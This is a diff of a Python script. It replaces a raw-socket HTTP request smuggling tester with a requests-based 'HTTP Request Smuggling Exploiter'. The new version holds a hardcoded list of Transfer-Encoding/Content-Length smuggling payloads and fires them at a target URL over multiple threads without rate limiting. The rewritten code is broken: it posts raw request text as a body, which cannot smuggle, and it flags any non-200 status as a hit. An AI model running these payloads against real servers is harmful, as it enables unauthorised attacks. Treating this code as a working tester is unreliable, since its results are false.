@@ -1,183 +1,120 @@
-#!/usr/bin/env python3
-
-import argparse
-import socket
-import ssl
-import sys
+import requests
 import threading
 import time
+import random
+import sys
+import argparse
+import os
+from colorama import Fore, Style
 from urllib.parse import urlparse
-from colorama import Fore, Style, init
 
-# Initialize Colorama
-init(autoreset=True)
+# Constants for colors
+SUCCESS_COLOR = Fore.GREEN
+INFO_COLOR = Fore.YELLOW
+ERROR_COLOR = Fore.RED
+RESET_COLOR = Style.RESET_ALL
 
-# =========================
-# Helper Functions
-# =========================
+# Common HTTP Smuggling Payloads
+smuggling_payloads = [
+    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
+    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n5\r\n0\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n5\r\n0\r\n\r\n",
+    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n0\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n0\r\n\r\n",
+    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n5\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n5\r\n\r\n",
+    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n0\r\n5\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n0\r\n5\r\n\r\n"
+]
 
-def verbose_print(msg, level="info"):
-    if args.verbose:
-        color = {
-            "info": Fore.CYAN,
-            "success": Fore.GREEN,
-            "warn": Fore.YELLOW,
-            "error": Fore.RED
-        }.get(level, Fore.WHITE)
-        print(color + "[*] " + msg + Style.RESET_ALL)
-
-def build_request(host, payload, method="POST", headers=None):
-    """Build a basic HTTP request"""
-    if headers is None:
-        headers = {}
-
-    request_line = f"{method} / HTTP/1.1\r\n"
-    default_headers = {
-        "Host": host,
-        "User-Agent": "SmuggleScanner/1.0",
-        "Content-Length": str(len(payload)),
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Connection": "keep-alive"
+# Function to test request smuggling on a given URL
+def test_smuggling(url, proxy=None, verbose=False):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
     }
-    default_headers.update(headers)
+    
+    if verbose:
+        print(f"{INFO_COLOR}[*] Testing URL: {url}{RESET_COLOR}")
 
-    header_lines = ''.join(f"{k}: {v}\r\n" for k, v in default_headers.items())
-    return f"{request_line}{header_lines}\r\n{payload}".encode()
+    # Loop through payloads
+    for payload in smuggling_payloads:
+        # Create a custom request with the smuggling payload
+        smuggling_payload = payload.format(urlparse(url).hostname)
+        response = send_request(url, smuggling_payload, headers, proxy, verbose)
+        
+        # Check if smuggling is successful
+        if response:
+            if response.status_code != 200:
+                print(f"{SUCCESS_COLOR}[+] Smuggling detected with payload: {payload}{RESET_COLOR}")
+                print(f"{SUCCESS_COLOR}[+] Response Status: {response.status_code}{RESET_COLOR}")
+                print(f"{SUCCESS_COLOR}[+] Response: {response.text[:200]}{RESET_COLOR}")
+                return True  # Smuggling success
 
-def connect_target(host, port, use_ssl=False):
-    """Connect to host"""
-    sock = socket.create_connection((host, port))
-    if use_ssl:
-        context = ssl.create_default_context()
-        sock = context.wrap_socket(sock, server_hostname=host)
-    return sock
+    print(f"{ERROR_COLOR}[-] No smuggling vulnerability found for URL: {url}{RESET_COLOR}")
+    return False
 
-def connect_proxy(proxy_host, proxy_port):
-    """Connect to proxy"""
-    sock = socket.create_connection((proxy_host, proxy_port))
-    return sock
-
-def send_request(host, port, request, use_ssl=False, proxy=None):
-    """Send a raw request either direct or via proxy"""
+# Function to send the HTTP request with a specific payload
+def send_request(url, payload, headers, proxy, verbose):
     try:
+        if verbose:
+            print(f"{INFO_COLOR}[*] Sending payload: {payload[:50]}...{RESET_COLOR}")
+        
+        # Send the request
         if proxy:
-            proxy_host, proxy_port = proxy
-            verbose_print(f"Connecting to proxy {proxy_host}:{proxy_port}", "info")
-            sock = connect_proxy(proxy_host, proxy_port)
+            proxies = {
+                "http": proxy,
+                "https": proxy
+            }
+            response = requests.post(url, data=payload, headers=headers, proxies=proxies, allow_redirects=True)
         else:
-            verbose_print(f"Connecting to target {host}:{port}", "info")
-            sock = connect_target(host, port, use_ssl)
-
-        if proxy and use_ssl:
-            # For HTTPS via proxy, need to establish CONNECT tunnel first
-            connect_request = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()
-            sock.sendall(connect_request)
-            response = sock.recv(4096)
-            if b"200" not in response:
-                print(Fore.RED + "[-] Proxy tunnel failed." + Style.RESET_ALL)
-                return
-            context = ssl.create_default_context()
-            sock = context.wrap_socket(sock, server_hostname=host)
-
-        sock.sendall(request)
-        response = sock.recv(8192)
-        verbose_print(f"Received {len(response)} bytes", "success")
+            response = requests.post(url, data=payload, headers=headers, allow_redirects=True)
+        
+        if verbose:
+            print(f"{INFO_COLOR}[*] Response Code: {response.status_code}{RESET_COLOR}")
         return response
-
-    except Exception as e:
-        print(Fore.RED + f"[-] Error sending request: {e}" + Style.RESET_ALL)
+    except requests.exceptions.RequestException as e:
+        print(f"{ERROR_COLOR}[!] Error: {str(e)}{RESET_COLOR}")
         return None
-    finally:
-        try:
-            sock.close()
-        except:
-            pass
 
-def smuggle_attempt(url, payload, headers=None):
-    """Attempt smuggling"""
-    parsed = urlparse(url)
-    host = parsed.hostname
-    port = parsed.port or (443 if parsed.scheme == "https" else 80)
-    path = parsed.path or "/"
-    use_ssl = parsed.scheme == "https"
+# Thread worker to handle testing in parallel
+def worker(url, proxy, verbose):
+    test_smuggling(url, proxy, verbose)
 
-    request = build_request(host, payload, headers=headers)
-    proxy_tuple = None
-    if args.proxy:
-        proxy_parsed = urlparse(args.proxy)
-        proxy_tuple = (proxy_parsed.hostname, proxy_parsed.port)
-
-    verbose_print(f"Sending smuggle payload to {host}:{port}", "info")
-    response = send_request(host, port, request, use_ssl, proxy=proxy_tuple)
-
-    if response:
-        if b"HTTP/1.1 301" in response or b"HTTP/1.1 302" in response:
-            print(Fore.YELLOW + "[!] Redirect detected. Possible reaction to smuggled request." + Style.RESET_ALL)
-        elif b"HTTP/1.1 400" in response:
-            print(Fore.RED + "[-] 400 Bad Request (may indicate firewall or server error)." + Style.RESET_ALL)
-        else:
-            print(Fore.GREEN + "[+] Response received!" + Style.RESET_ALL)
-        if args.verbose:
-            print(response.decode(errors="ignore"))
-    else:
-        print(Fore.RED + "[-] No response." + Style.RESET_ALL)
-
-# =========================
-# Main Execution
-# =========================
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="HTTP Request Smuggling Tester")
-
-    parser.add_argument("--url", help="Target URL (example: https://example.com)", required=True)
-    parser.add_argument("--proxy", help="Proxy to use (example: http://127.0.0.1:8080)")
-    parser.add_argument("--payload", help="Single payload string")
-    parser.add_argument("--payload-file", help="Payload file to load (one per line)")
-    parser.add_argument("--headers", help="Additional headers (key:value,key:value)", default="")
-    parser.add_argument("--threads", type=int, default=1, help="Number of threads")
-    parser.add_argument("--rate-limit", type=float, default=0.5, help="Delay between requests in seconds")
-    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
+# Main function to handle argument parsing and execution
+def main():
+    parser = argparse.ArgumentParser(description="HTTP Request Smuggling Exploiter")
+    parser.add_argument('--url', type=str, required=True, help='Target URL for testing')
+    parser.add_argument('--proxy', type=str, help='Proxy server for routing requests (optional)')
+    parser.add_argument('--verbose', action='store_true', help='Verbose output for testing process')
+    parser.add_argument('--threads', type=int, default=1, help='Number of threads to run (default: 1)')
 
     args = parser.parse_args()
+    
+    # Check if URL was provided
+    if not args.url:
+        print(f"{ERROR_COLOR}[!] URL is required. Use --url <url>{RESET_COLOR}")
+        sys.exit(1)
+    
+    # Prepare proxy
+    proxy = args.proxy if args.proxy else None
 
-    custom_headers = {}
-    if args.headers:
-        for h in args.headers.split(","):
-            try:
-                k, v = h.split(":")
-                custom_headers[k.strip()] = v.strip()
-            except ValueError:
-                print(Fore.RED + "[-] Header format error. Use key:value,key:value" + Style.RESET_ALL)
-                sys.exit(1)
+    # Set up threading for concurrent testing
+    threads = []
+    for _ in range(args.threads):
+        t = threading.Thread(target=worker, args=(args.url, proxy, args.verbose))
+        threads.append(t)
+        t.start()
 
+    # Wait for all threads to complete
+    for t in threads:
+        t.join()
+
+    print(f"{INFO_COLOR}[*] Testing complete!{RESET_COLOR}")
+
+if __name__ == "__main__":
     try:
-        payloads = []
-        if args.payload_file:
-            with open(args.payload_file, "r") as f:
-                payloads = [line.strip() for line in f if line.strip()]
-        elif args.payload:
-            payloads = [args.payload]
-        else:
-            print(Fore.RED + "[-] No payload provided." + Style.RESET_ALL)
-            sys.exit(1)
-
-        def worker(payload):
-            smuggle_attempt(args.url, payload, headers=custom_headers)
-            time.sleep(args.rate_limit)
-
-        threads = []
-        for payload in payloads:
-            t = threading.Thread(target=worker, args=(payload,))
-            threads.append(t)
-            t.start()
-
-            if args.threads <= 1:
-                t.join()
-
-        if args.threads > 1:
-            for t in threads:
-                t.join()
-
+        main()
     except KeyboardInterrupt:
-        print(Fore.RED + "\n[!] Script terminated by user." + Style.RESET_ALL)
+        print(f"{ERROR_COLOR}[!] Script interrupted by user.{RESET_COLOR}")
         sys.exit(0)
